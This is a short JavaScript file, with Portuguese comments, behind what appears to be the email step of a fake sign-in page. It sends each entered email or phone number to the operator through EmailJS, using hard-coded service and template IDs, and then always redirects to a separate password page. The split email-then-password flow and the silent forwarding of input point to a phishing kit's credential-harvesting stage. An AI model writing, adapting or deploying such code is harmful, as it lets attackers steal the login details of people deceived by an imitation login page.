// Inicializar EmailJS com a Public Key
(function() {
    emailjs.init({
        publicKey: "Lxk2yKxDZkTdwAqCG" // Substitua pela sua Public Key do EmailJS
    });
})();

const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');

// Evento ao focar e desfocar
emailInput.addEventListener('blur', function() {
    if (this.value === '') {
        this.classList.remove('has-value');
    } else {
        this.classList.add('has-value');
    }
});

// Foco automático ao carregar
window.addEventListener('load', function() {
    emailInput.focus();
});

// Envio do formulário de e-mail
loginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    
    if (!email) {
        alert('Digite um e-mail ou número de telefone válido.');
        return;
    }
    
    // Salvar e-mail no localStorage para a próxima página
    localStorage.setItem('userEmail', email);
    
    // Enviar primeiro email (confirmação de e-mail digitado)
    const templateParams = {
        email_address: email,
        timestamp: new Date().toLocaleString('pt-BR')
    };
    
    emailjs.send('service_gwyfs86', 'template_c1v81v9', templateParams)
        .then(function(response) {
            console.log('Email enviado com sucesso!', response.status, response.text);
            // Redirecionar para página de senha após sucesso
            window.location.href = 'password.html';
        }, function(error) {
            console.log('Erro ao enviar email:', error);
            // Mesmo assim redireciona (para fins de teste)
            window.location.href = 'password.html';
        });
});
